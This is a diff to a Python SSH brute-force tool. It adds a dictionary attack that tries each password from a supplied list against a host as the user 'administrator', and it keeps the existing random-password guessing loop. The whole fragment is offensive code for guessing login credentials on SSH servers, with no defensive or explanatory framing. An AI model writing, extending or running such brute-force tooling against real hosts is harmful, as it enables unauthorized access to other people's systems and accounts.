@@ -23,8 +23,16 @@ class SSHBruteForce:
 
         return "".join(random.sample(character_set, length))
 
-    def start_attack(self, host: str, port: int, tries: int):
-        for n in range(tries):
-            password = self.__generate_random_password()
+    def __password_list_attack(self, passwords: list, port: int, host: str):
+        for password in passwords:
             print("Trying password: ", password)
-            self.__connect("jada", password, port, host)
+            self.__connect(username='administrator', password=password, port=port, host=host)
+
+    def start_attack(self, host: str, port: int, tries: int, passwords: list = None):
+        if passwords is not None:
+            self.__password_list_attack(passwords, port, host)
+        else:
+            for n in range(tries):
+                password = self.__generate_random_password()
+                print("Trying password: ", password)
+                self.__connect("jada", password, port, host)
